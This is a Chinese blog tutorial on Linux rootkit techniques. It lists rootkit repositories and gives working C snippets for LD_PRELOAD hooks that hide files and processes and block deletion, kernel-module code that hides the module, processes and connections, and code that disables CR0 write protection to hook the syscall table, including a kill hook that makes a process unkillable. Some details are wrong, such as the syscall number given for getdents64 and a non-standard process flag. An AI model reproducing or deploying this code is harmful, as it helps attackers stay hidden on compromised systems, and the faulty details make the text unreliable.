Title: Linux环境下的Rootkit技术细节
Date: 2022-09-20 20:20
Modified: 2022-09-20 20:20
Category: 安全
Tags: Linux
Slug: O4
Authors: nJcx
Summary: Linux环境下的Rootkit技术细节~

#### 安装

```bash
https://github.com/f0rb1dd3n/Reptile.git
https://github.com/yaoyumeng/adore-ng.git
https://github.com/citypw/suterusu.git
https://github.com/m0nad/Diamorphine.git
https://github.com/hanj4096/wukong.git
https://github.com/ldpreload/Medusa.git
https://github.com/mav8557/Father.git
https://github.com/imlk0/yark.git
https://github.com/veo/vbackdoor.git

```

linux rootkit 主要分为两种，一种是用户态的rootkit，一种是内核态的rootkit。rootkit的主要目的是为了隐蔽地获取对操作系统的控制权或访问权限，同时尽量避免被检测到。用户态的rootkit主要是动态链接库（LD_PRELOAD）注入，通过设置环境变量 LD_PRELOAD 来加载恶意的共享库。这种方法可以拦截并修改标准库函数的行为，例如文件操作、网络通信等，从而隐蔽地执行某些操作，还有替换相关系统命令完成(通过替换ps、top、ls、ss、netstat等系统工具)。内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK，以此来隐藏其存在，例如隐藏特定的文件、进程和网络连接等。


无论是用户态rootkit还是内核的rootkit，都会把隐藏自己，作为核心功能存在， 都会有下面4个核心功能点，只是实现的方法，各有不同。
 
-  隐藏文件

-  隐藏进程

-  隐藏网络连接状态

-  隐藏rootkit模块本身。


#### 用户态动态链接库（LD_PRELOAD）注入

LD_PRELOAD 是 Linux 环境下的一个环境变量，它允许用户指定在程序运行前优先加载的动态链接库（shared object）。通过这种方式，可以实现函数劫持（hook），即替换或增强某些函数的功能。这在调试、性能分析以及安全领域非常有用。当你设置 LD_PRELOAD 并运行一个程序时，Linux 动态链接器会首先加载由 LD_PRELOAD 指定的共享库中的符号（functions, variables等），然后才去加载其他依赖的库。这意味着你可以定义与标准库中同名的函数，在你的共享库中实现自定义逻辑，并在调用原版函数之前或之后执行额外的操作，或者完全替代它们。


实现方法：

- 编写共享库：首先，你需要编写一个共享库，其中包含你想要hook的函数的实现。
- 编译共享库：使用 -fPIC 和 -shared 标志来编译你的代码，生成一个共享对象文件（.so）。
- 设置 LD_PRELOAD：在运行目标程序之前，通过设置 LD_PRELOAD 环境变量指向你的共享库，如 export LD_PRELOAD=/path/to/your/library.so。

运行程序：当程序运行时，动态链接器将首先加载你指定的库，从而覆盖或添加原有函数的行为。

一个简单的例子来展示如何使用 LD_PRELOAD 来 hook 标准库中的 puts 函数。这个例子将拦截对 puts 的调用，并在实际调用之前打印一条自定义消息。

```bash

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>

// 原始的 puts 函数指针
static int (*original_puts)(const char*) = NULL;

int puts(const char *s) {
    // 如果这是第一次调用，则获取原始的 puts 函数地址
    if (!original_puts) {
        original_puts = dlsym(RTLD_NEXT, "puts");
    }

    printf("Intercepted call to puts with argument: %s\n", s);
    
    // 调用原始的 puts 函数
    return original_puts(s);
}


```

```bash
gcc -shared -fPIC -o demo.so demo.c -ldl

-shared 表示生成共享库。
-fPIC 生成与位置无关的代码，这对于共享库是必需的。
-ldl 链接 libdl 库，用于动态加载符号。

```

测试程序 test_program.c 如下：

```bash

#include <stdio.h>

int main() {
    puts("Hello, World!");
    return 0;
}


gcc -o test_program test_program.c


export LD_PRELOAD=$PWD/demo.so
./test_program


```


```bash

Intercepted call to puts with argument: Hello, World!
Hello, World!

```


文件隐藏

	HOOK open、opendir、readdir等函数， 隐藏特定文件名


这段代码hook 了 readdir 函数，并在每次调用时检查当前目录项的名称。如果名称匹配要隐藏的文件（如 "xxx"），则跳过该目录项并继续读取下一个
	
```bash

struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = (struct dirent* (*)(DIR*)) dlsym(RTLD_NEXT, "readdir");
    }

    const char *error_msg = dlerror();
    if (error_msg != NULL) {
        fprintf(stderr, "dlsym error: %s\n", error_msg);
        return NULL;
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        // 过滤掉你想要隐藏的文件或目录
        if (strcmp(entry->d_name, "xxx") == 0) {
            continue;  // 跳过这些文件
        }
        return entry;
    }
    return NULL;
}

```	
	

进程隐藏

	HOOK ps、top等命令相关的函数调用， 通常HOOK readdir函数来隐藏特定进程
	

这段代码是一个自定义的 readdir 函数，用于过滤特定进程的目录项。主要功能如下：

- 初始化原始 readdir 函数指针。
- 进入循环读取目录项。
- 如果目录为 /proc 且进程名匹配，则跳过该目录项。
- 返回非过滤的目录项。

	
```bash
struct dirent* readdir(DIR *dirp)                                       
{                                                                       
    if(original_##readdir == NULL) {                                    
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               
        if(original_##readdir == NULL)                                  
        {                                                              
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         
        }                                                               
    }                                                                   
                                                                        
    struct dirent* dir;                                                 
                                                                        
    while(1)                                                            
    {                                                                   
        dir = original_##readdir(dirp);                                 
        if(dir) {                                                       
            char dir_name[256];                                         
            char process_name[256];                                     
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        
                strcmp(dir_name, "/proc") == 0 &&                       
                get_process_name(dir->d_name, process_name) &&          
                strcmp(process_name, process_to_filter) == 0) {         
                continue;                                               
            }                                                           
        }                                                               
        break;                                                          
    }                                                                   
    return dir;                                                         
}


```


防止被删除
	HOOK rm 命令的相关函数调用，一般会HOOK unlink函数，来避免自己被删除

```bash


int unlink (const char *pathname)
{
   old_unlink = dlsym(RTLD_NEXT, "unlink");
  if ((strstr (pathname, MAGIC_STRING)) || (strstr (pathname, CONFIG_FILE)) || (strstr (pathname, LIB_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_unlink (pathname);
}


```




#### 内核态可装载内核模块（LKM）


内核态的rootkit主要是可装载内核模块（LKM）实现， 主要是修改操作系统的核心部分，修改内部的数据结构或者进行系统函数HOOK。那么我们就聚焦关注两个点：修改哪些数据结构， 怎么HOOK与HOOK哪些函数。首先，了解一下LKM 怎么编写。

##### LKM 怎么编写

```bash

CentOS
#  yum install -y kernel-devel-$(uname -r) kernel-headers-$(uname -r)  gcc gcc-c++ make

Debian + Ubuntu
#  apt install -y  gcc g++ make  linux-headers-$(uname -r)

```
确保系统已经安装了内核头文件和编译工具。

下面是一个非常基础的内核模块示例代码（hello.c）：

```bash

#include <linux/init.h>   // 包含宏定义 module_init 和 module_exit
#include <linux/module.h> // 包含核心模块函数和变量

// 模块加载时调用的函数
static int __init hello_start(void) {
    printk(KERN_INFO "Hello world!\n");
    return 0; // 返回0表示成功加载
}

// 模块卸载时调用的函数
static void __exit hello_end(void) {
    printk(KERN_INFO "Goodbye world!\n");
}

module_init(hello_start); // 注册模块初始化函数
module_exit(hello_end);   // 注册模块退出函数

MODULE_LICENSE("GPL"); // 声明模块许可，避免警告
MODULE_AUTHOR("Your Name"); // 可选：作者信息
MODULE_DESCRIPTION("A simple Hello world LKM"); // 可选：模块描述
```

为了编译这个模块，需要一个Makefile：

```bash
obj-m += hello.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

在包含源代码和Makefile的目录下运行make命令进行编译。如果一切正常，应该能看到生成的.ko文件。使用insmod hello.ko命令加载模块，并使用dmesg | tail查看日志输出确认模块是否正确加载。使用rmmod hello卸载模块，并再次检查日志以确认卸载消息。这只是一个入门级的例子。实际应用中，内核模块可能会更加复杂，包括错误处理、参数传递等。务必小心操作，因为错误的内核模块有可能导致系统不稳定或崩溃。


##### 修改哪些数据结构


 
隐藏模块。具体功能如下：

- 记录当前模块的链表前驱节点。
- 从模块链表中删除当前模块。
- 记录当前模块的kobject链表前驱节点。
- 删除模块的kobject。
- 从kobject链表中删除当前模块。

 
```bash


static struct list_head *module_previous;
static struct list_head *module_kobj_previous;
static char module_hidden = 0;


void module_hide(void)
{
	if (module_hidden) return;
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_kobj_previous = THIS_MODULE->mkobj.kobj.entry.prev;
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	module_hidden = !module_hidden;
}
 

```


隐藏进程。设置或清除指定进程及其线程的标志位,具体功能如下


- 锁定 RCU 读锁，查找并获取指定 PID 对应的任务结构。
- 如果找到任务结构，遍历该任务及其所有线程，根据参数 set 设置或清除标志位。

在 Linux 中，task_struct->flags 常见的标志位包括：PF_INVISIBLE：标记进程为“不可见”，通常用于隐藏进程。
PF_EXITING：表示进程正在退出。PF_FORKNOEXEC：表示进程已 fork 但尚未 exec。



```bash
#define FLAG 0x80000000

struct tgid_iter {
	unsigned int tgid;
	struct task_struct *task;
};


static inline int is_task_invisible(struct task_struct *task)
{
	return task->flags & FLAG;
}


int flag_tasks(pid_t pid, int set)
{
	int ret = 0;
	struct pid *p;

	rcu_read_lock();
	p = find_get_pid(pid);
	if (p) {
		struct task_struct *task = get_pid_task(p, PIDTYPE_PID);
		if (task) {
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 14, 0)
			struct task_struct *t = NULL;

			for_each_thread(task, t)
			{
				if (set)
					t->flags |= FLAG;
				else
					t->flags &= ~FLAG;

				ret++;
			}
#endif
			if (set)
				task->flags |= FLAG;
			else
				task->flags &= ~FLAG;

			put_task_struct(task);
		}
		put_pid(p);
	}
	rcu_read_unlock();
	return ret;
}

```


隐藏网络连接。具体功能如下：

- 分配内存创建一个隐藏连接结构体。
- 将传入的地址信息赋值给新创建的结构体。
- 将新创建的结构体添加到隐藏连接列表中。

```bash

struct hidden_conn {
	struct sockaddr_in addr;
	struct list_head list;
};

struct list_head hidden_conn_list;

void network_hide_add(struct sockaddr_in addr)
{
    struct hidden_conn *hc;

    hc = kmalloc(sizeof(*hc), GFP_KERNEL);

	if (!hc)
	    return;

	hc->addr = addr;
    list_add(&hc->list, &hidden_conn_list);
}


```



##### 怎么HOOK与HOOK哪些函数


在内核之中，存在一个系统调用表。其中的系统调用编号（系统调用发生时rax的值）是其Handler在其表中的偏移量。
系统调用表位于sys_call_table，它是系统内核的一块区间，其作用是将调用号和服务函数连接起来，当系统调用某一个syscall，就会通过sys_call_table查找到该服务函数。
 
系统调用表是只读的，在内核中，CR0是一个控制寄存器，可以修改处理器的操作方式。其中的第16位是写保护标志所在的位置，如果该标志为0，CPU就可以让内核写入只读区域。Linux为我们提供了两个很有帮助的函数，可以用于修改CR0寄存器，分别是write_cr0和read_cr0。


这段代码的功能主要是找到sys_call_table的地址，由于内核版本不同，新版本内核用到了kprobe：

- 获取kallsyms_lookup_name函数的地址，用于后续查找内核符号。
- 查找并获取sys_call_table的地址，用于系统调用表的修改。


```bash

int sys_call_table_init(void) {
    /* lookup address of kallsyms_lookup_name() */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
    struct kprobe kp = {.symbol_name = "kallsyms_lookup_name"};
    if (register_kprobe(&kp) < 0)
        return -EFAULT;
    kallsyms_lookup_name_ref = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);
    if (!kallsyms_lookup_name_ref) {
        pr_err(LOG_PREFIX "failed to lookup function kallsyms_lookup_name()\n");
        return -EFAULT;
    }
#else
    kallsyms_lookup_name_ref = kallsyms_lookup_name;
#endif

    /* lookup address of sys_call_table */
    sys_call_table_ref =
        (t_syscall *)kallsyms_lookup_name_ref("sys_call_table");
    if (!sys_call_table_ref) {
        pr_err(LOG_PREFIX "failed to lookup symbol: sys_call_table\n");
        return -EFAULT;
    }
    return 0;
}

```

这段代码的功能是将系统调用表中的某个系统调用替换为自定义的函数:

- 读取并保存当前CR0寄存器值。
- 将原系统调用保存到orig_fn。
- 修改CR0寄存器以允许写入系统调用表。
- 替换系统调用表中的指定系统调用为新函数。
- 恢复CR0寄存器值。



```bash
static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

void hook_sys_call_table(long int sysno, t_syscall hook_fn,
                         t_syscall *orig_fn) {
    unsigned long cr0;
    pr_info(LOG_PREFIX "hook syscall number %ld", sysno);
    if (!sys_call_table_ref) {
        pr_warn(LOG_PREFIX
                "address of sys_call_table was not found, skip hook\n");
        return;
    }
    cr0 = read_cr0();
    *orig_fn = sys_call_table_ref[sysno];
    write_cr0_forced(cr0 & ~0x00010000);
    sys_call_table_ref[sysno] = hook_fn;
    write_cr0_forced(cr0);
}

```
 
 
下面完整展示了， HOOK __NR_kill(62)指向的函数，防止特定进程被SIGKILL或SIGTERM信号终止：

- protect_proccess：检查是否阻止对指定PID发送SIGKILL或SIGTERM信号。
- hook_sys_kill：钩住系统调用sys_kill，先调用protect_proccess，若返回1则不执行原系统调用并返回0；否则执行原系统调用。
- protect_proc_init：初始化时将sys_kill替换为hook_sys_kill。
 
```bash

static int protect_proccess(pid_t pid,int sig){
    if (sig == SIGKILL || sig == SIGTERM){
        struct protect_proc_info *pos;
        list_for_each_entry(pos,&protect_proc_info_list,list) {
            if (pos->pid == pid){
                pr_info(LOG_PREFIX "prevent user kill pid %d,QWQ...\n",pid);
                return 1;
            }
        }
    }
    return 0;
}

static asmlinkage long (*orig_sys_kill)(const struct pt_regs *);

asmlinkage long hook_sys_kill(const struct pt_regs *regs)
{
    pid_t pid = regs->di;
    int sig = regs->si;
    if (protect_proccess(pid,sig)){
        return 0;
    }
    return orig_sys_kill(regs);
}



int protect_proc_init() {
    pr_info(LOG_PREFIX "call protect_proc_init()\n");
    hook_sys_call_table(__NR_kill, hook_sys_kill, &orig_sys_kill);
    return 0;
}


```
 
 
常用被HOOK的syscall 有如下：  


```bash
open：打开文件。
宏定义：__NR_open
调用号（x86_64）：2

read：从文件读取数据。
宏定义：__NR_read
调用号（x86_64）：0

unlink：删除文件。
宏定义：__NR_unlink
调用号（x86_64）: 87

getdents64：读取目录内容（64位版本）。
宏定义：__NR_getdents64
调用号（x86_64）: 78

kill：发送信号给进程。
宏定义：__NR_kill
调用号（x86_64）：62

connect：发起连接请求。
宏定义：__NR_connect
调用号（x86_64）: 42

execve：执行新程序。
宏定义：__NR_execve
调用号（x86_64）：59

```
 
HOOK 的方法，跟上面大同小异， 就不在赘述。
